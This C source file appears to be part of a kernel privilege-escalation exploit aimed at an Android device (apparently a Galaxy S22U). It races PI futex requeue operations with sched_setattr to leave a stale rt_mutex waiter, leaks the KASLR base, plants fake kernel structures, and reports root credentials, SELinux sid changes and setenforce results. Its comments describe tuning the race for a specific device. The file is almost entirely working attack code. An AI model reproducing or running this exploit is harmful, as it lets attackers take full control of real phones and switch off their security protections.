#include "common.h"

uint32_t f_wait;
uint32_t f_pi_target;
uint32_t f_pi_chain;
atomic_int waiter_ready;
atomic_int waiter_waiting;
atomic_int owner_started;
atomic_int owner_chain_done;
atomic_int requeue_done;
atomic_int route_done;
atomic_int waiter_tid;
atomic_int punch_consume_go;
atomic_int punch_consume_stop;
atomic_int consumer_inflight;
atomic_int consumer_calls;
atomic_int consumer_success;
atomic_int main_route_delay_usec;
atomic_int pipe_prepare_request;
atomic_int pipe_prepare_done;
int memfd_leak;

#ifdef PSELECT_WAITER_LAYOUT_5_10
static void waiter_interrupt_handler(int signo) {
  (void)signo;
}
#endif

void *waiter_thread(void *arg __attribute__((unused))) {
  disable_rseq_for_thread();
#ifdef PSELECT_WAITER_LAYOUT_5_10
  struct sigaction sa;
  memset(&sa, 0, sizeof(sa));
  sa.sa_handler = waiter_interrupt_handler;
  sigemptyset(&sa.sa_mask);
  SYSCHK(sigaction(SIGUSR1, &sa, NULL));
  sigset_t unblock;
  sigemptyset(&unblock);
  sigaddset(&unblock, SIGUSR1);
  SYSCHK(pthread_sigmask(SIG_UNBLOCK, &unblock, NULL));
#endif

  int tid = (int)syscall(SYS_gettid);
  atomic_store(&waiter_tid, tid);

  if (futex_op(&f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0) {
    pr_error("waiter lock chain errno=%d\n", errno);
  }

  atomic_store(&waiter_ready, 1);
  while (!atomic_load(&owner_started)) {
    usleep(1000);
  }

  struct timespec timeout;
  SYSCHK(clock_gettime(CLOCK_MONOTONIC, &timeout));
  timeout.tv_sec += ROUTE_WAIT_SECONDS;

  atomic_store(&waiter_waiting, 1);
  errno = 0;
  long wait_ret = futex_op(&f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &timeout,
                           &f_pi_target, 0);
  pr_info("waiter futex wait returned ret=%ld errno=%d\n", wait_ret, errno);

  do_pselect_fake_lock_route();
  atomic_store(&route_done, 1);

  futex_op(&f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
  while (!atomic_load(&owner_chain_done)) {
    usleep(1000);
  }
  return NULL;
}

void *owner_thread(void *arg __attribute__((unused))) {
  disable_rseq_for_thread();

  long lock_target = futex_op(&f_pi_target, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
  if (lock_target != 0) {
    pr_error("owner lock target errno=%d\n", errno);
  }

  while (!atomic_load(&waiter_ready)) {
    usleep(1000);
  }

  atomic_store(&owner_started, 1);
  futex_op(&f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
  atomic_store(&owner_chain_done, 1);

  for (;;) {
    sleep(1);
  }
}

void *consumer_thread(void *arg __attribute__((unused))) {
  disable_rseq_for_thread();
  pin_to_core(CONSUMER_CORE);

  int seen = 0;

  while (!atomic_load(&punch_consume_stop)) {
    int seq = atomic_load(&punch_consume_go);
    if (seq == 0 || seq == seen) {
      __asm__ volatile("yield" ::: "memory");
      continue;
    }

    seen = seq;
    int tid = atomic_load(&waiter_tid);
    int calls_this_seq = 0;
    while (!atomic_load(&punch_consume_stop) &&
           atomic_load(&punch_consume_go) == seq) {
      if (atomic_load(&punch_consume_stop) ||
          atomic_load(&punch_consume_go) != seq) {
        continue;
      }
      int delay_usec = atomic_load(&main_route_delay_usec);
      if (delay_usec > 0) {
        usleep((useconds_t)delay_usec);
      }
      for (int burst = 0; burst < PSELECT_CONSUMER_BURST_CALLS; burst++) {
        if (atomic_load(&punch_consume_stop) ||
            atomic_load(&punch_consume_go) != seq) {
          break;
        }
        atomic_store(&consumer_inflight, 1);
        if (atomic_load(&punch_consume_stop) ||
            atomic_load(&punch_consume_go) != seq) {
          atomic_store(&consumer_inflight, 0);
          break;
        }
        atomic_fetch_add(&consumer_calls, 1);
        /*
         * Unprivileged tasks can only raise nice.  One punch: leftover
         * TREE is S22U one-child (owner stays 0).  Kick pselect so the
         * waiter leaves the overlay before other ashmem opens.
         */
        /*
         * Device adaptation (required, measured): no logging inside this
         * window.  The main thread is parked in pselect with the stale
         * rt_mutex_waiter live on its stack, so any console write() from
         * here perturbs a microsecond-wide race (IonStack-S22U MEMORY.md
         * 4f: their own pr_warning tore the payload).  With the two prints
         * that used to be here, 3/3 runs on this device died right after
         * "one-punch leftover"; silent, the stage proceeds.
         */
        int consumer_nice = PSELECT_CONSUMER_NICE - 1;
        errno = 0;
        long sched_ret = sched_setattr_tid(tid, consumer_nice);
        int sched_errno __attribute__((unused)) = errno;
        if (sched_ret == 0) {
          atomic_fetch_add(&consumer_success, 1);
#ifdef PSELECT_WAITER_LAYOUT_5_10
          errno = 0;
          (void)syscall(SYS_tkill, tid, SIGUSR1);
#endif
        }
        atomic_store(&consumer_inflight, 0);
        calls_this_seq++;
        if (calls_this_seq >= CONSUMER_MAX_CALLS) {
          atomic_store(&punch_consume_go, 0);
          break;
        }
      }
    }
  }

  return NULL;
}

void wait_for_consumer_idle(void) {
  atomic_store(&punch_consume_go, 0);
  for (int n = 0; n < 4000 && atomic_load(&consumer_inflight); n++) {
    usleep(1000);
  }
}

void stop_punch_for_pipe(void) {
  atomic_store(&punch_consume_go, 0);
  atomic_store(&punch_consume_stop, 1);
  wait_for_consumer_idle();
  pr_info("punch stop for pipe inflight=%d\n",
          atomic_load(&consumer_inflight));
}

void reset_main_route_state(void) {
  f_wait = 0;
  f_pi_target = 0;
  f_pi_chain = 0;
  atomic_store(&waiter_ready, 0);
  atomic_store(&waiter_waiting, 0);
  atomic_store(&owner_started, 0);
  atomic_store(&owner_chain_done, 0);
  atomic_store(&requeue_done, 0);
  atomic_store(&route_done, 0);
  atomic_store(&waiter_tid, 0);
  atomic_store(&punch_consume_go, 0);
  atomic_store(&punch_consume_stop, 0);
  atomic_store(&consumer_inflight, 0);
  atomic_store(&consumer_calls, 0);
  atomic_store(&consumer_success, 0);
  atomic_store(&main_route_delay_usec, PSELECT_ENTER_DELAY_USEC);
  atomic_store(&pipe_prepare_request, 0);
  atomic_store(&pipe_prepare_done, 0);
  cfi_last_step = 0;
  cfi_last_errno = 0;
}

void run_main_route_threads(void) {
  reset_main_route_state();

  pthread_t waiter;
  pthread_t owner;
  pthread_t consumer;
  SYSCHK(pthread_create(&waiter, NULL, waiter_thread, NULL));
  SYSCHK(pthread_create(&owner, NULL, owner_thread, NULL));
  SYSCHK(pthread_create(&consumer, NULL, consumer_thread, NULL));

  while (!atomic_load(&waiter_waiting) || !atomic_load(&owner_started)) {
    usleep(1000);
  }

  usleep(100000);
  errno = 0;
  long requeue_ret = futex_op(&f_wait, FUTEX_CMP_REQUEUE_PI, 1, (void *)1,
                              &f_pi_target, 0);
  int requeue_errno = errno;
  pr_info("main futex requeue ret=%ld errno=%d\n", requeue_ret, requeue_errno);
  atomic_store(&requeue_done, 1);
#ifdef PSELECT_WAITER_LAYOUT_5_10
  /*
   * EDEADLK is the GhostLock trigger: remove_waiter drops the tree node
   * but leaves waiter_task->pi_blocked_on.  The waiter stays on f_wait;
   * wake it before the 8s timeout path can clean the leftover.
   */
  errno = 0;
  long wake_ret = futex_op(&f_wait, FUTEX_WAKE, 1, NULL, NULL, 0);
  int wake_errno = errno;
  int waiter_tid_now = atomic_load(&waiter_tid);
  errno = 0;
  long kill_ret = syscall(SYS_tkill, waiter_tid_now, SIGUSR1);
  pr_info("main waiter wake ret=%ld errno=%d tkill tid=%d ret=%ld errno=%d\n",
          wake_ret, wake_errno, waiter_tid_now, kill_ret, errno);
#endif

  while (!atomic_load(&route_done)) {
    if (atomic_exchange(&pipe_prepare_request, 0)) {
      pipebuf_page_base = prepare_pipe_buffer_page();
      atomic_store(&pipe_prepare_done, 1);
    }
    usleep(10000);
  }
}

/*
 * Silent deaths in this exploit are either a fatal signal in our own process or
 * a kernel panic, and the two need completely different investigation.  pr_error
 * already exits with a flushed message, so a log that simply stops means we were
 * killed -- and nothing in the log says by what.
 *
 * Turn that into a cause: report the signal number and the faulting address
 * straight to fd 1 with write(2), which needs no stdio state (stdout is already
 * _IONBF via set_unbuffer, but a handler must not depend on it).  SIGKILL stays
 * unobservable by design; if this prints nothing and the shell still exits, the
 * kernel went down.
 */
static void fatal_signal(int sig, siginfo_t *si, void *uc) {
  (void)uc;
  char b[112];
  int n = snprintf(b, sizeof(b), "\n[!] FATAL sig=%d addr=%p\n", sig,
                   si ? si->si_addr : (void *)0);
  if (n > 0) {
    ssize_t w = write(STDOUT_FILENO, b, (size_t)n);
    (void)w;
  }
  _exit(70);
}

static void install_fatal_handlers(void) {
  struct sigaction sa;
  memset(&sa, 0, sizeof(sa));
  sa.sa_sigaction = fatal_signal;
  sa.sa_flags = SA_SIGINFO;
  sigaction(SIGSEGV, &sa, NULL);
  sigaction(SIGBUS, &sa, NULL);
  sigaction(SIGILL, &sa, NULL);
  sigaction(SIGFPE, &sa, NULL);
  sigaction(SIGABRT, &sa, NULL);
}

int run_exploit(int argc, char **argv) {
  (void)argc;
  (void)argv;

  disable_rseq_for_thread();
  set_unbuffer();
  install_fatal_handlers();
  set_limit();
  if (getuid() == 0) {
    if (setgid(1000) != 0 || setuid(1000) != 0) {
      pr_error("drop to uid 1000 failed errno=%d\n", errno);
      return 1;
    }
  }
  /*
   * setuid() clears dumpable.  KernelSnitch needs /proc/<child>/mem,
   * which is EACCES unless the process is dumpable.  PR_SET_DUMPABLE
   * is allowed for the calling unprivileged task.
   */
  if (prctl(PR_SET_DUMPABLE, 1) != 0) {
    pr_error("PR_SET_DUMPABLE failed errno=%d\n", errno);
    return 1;
  }
  log_startup_context();
  init_ashmem_path();

  pin_to_core(CORE);
  if (getenv("QEMU_SKIP_SLIDE") && getenv("QEMU_SKIP_SLIDE")[0] != '0') {
    kaslr_done = 1;
    kaslr_base = KIMAGE_TEXT_BASE;
    kaslr_slide = 0;
    pr_info("skip slide leak by request; base=%016zx\n", kaslr_base);
  } else if (!slide_leak_kernel_base()) {
    pr_error("slide kaslr leak failed\n");
    return 1;
  }

  pin_to_core(CORE);
  page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);

  if (getenv("FOPS_PAGE_DRY_RUN") && getenv("FOPS_PAGE_DRY_RUN")[0] != '0') {
    int ok = page_base != 0 && fake_lock != 0 && fake_fops != 0;
    pr_info("fops page dry-run base=%016zx lock=%016zx w0=%016zx "
            "task=%016zx fops=%016zx ok=%d\n",
            page_base, fake_lock, fake_w0, fake_task, fake_fops, ok);
    return ok ? 0 : 2;
  }

  run_main_route_threads();

  pr_success("pipe-physrw-summary pid=%d done=%d root=%d kaslr=%d base=%016zx slide=%016zx\n",
             getpid(), atomic_load(&cfi_stage_done), root_child_done,
             kaslr_done, kaslr_base, kaslr_slide);
  pr_success("pipe physrw pid=%d done=%d root=%d kaslr=%d read_ok=%d "
             "write_ok=%d rw64=%d/%d uid=%u->%u sid=%u/%u->%u/%u "
             "selinux=%u->%u setgid=%d setuid=%d setenforce=%d/%d\n",
             getpid(), atomic_load(&cfi_stage_done), root_child_done, kaslr_done,
             physrw_read_ok, physrw_write_ok, physrw_read64_ok, physrw_write64_ok,
             root_uid_before, root_uid_after, cred_sid_before, real_cred_sid_before,
             cred_sid_after, real_cred_sid_after, selinux_before, selinux_after,
             setgid_ret, setuid_ret, setenforce_ret, setenforce_errno);
  if (pipe_prepare_child > 0) {
    SYSCHK(kill(pipe_prepare_child, SIGKILL));
    SYSCHK(waitpid(pipe_prepare_child, NULL, 0));
  }

  sleep(5);
  return 0;
}
